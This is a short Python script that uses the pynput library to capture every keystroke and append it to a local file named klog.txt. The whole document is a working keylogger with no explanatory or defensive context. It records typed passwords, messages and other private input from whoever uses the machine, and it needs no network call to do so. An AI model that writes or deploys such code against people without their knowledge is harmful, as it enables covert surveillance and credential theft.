from pynput.keyboard import Listener

def writeTofile(key):
	letter = str(key)
	letter = letter.replace("'", '')
	letter = letter.replace("Key.space", ' ')
	letter = letter.replace("Key.backspace", ' ')

	with open('klog.txt', 'a+') as f:
		f.write(letter)

with Listener(on_press=writeTofile) as l:
	l.join()
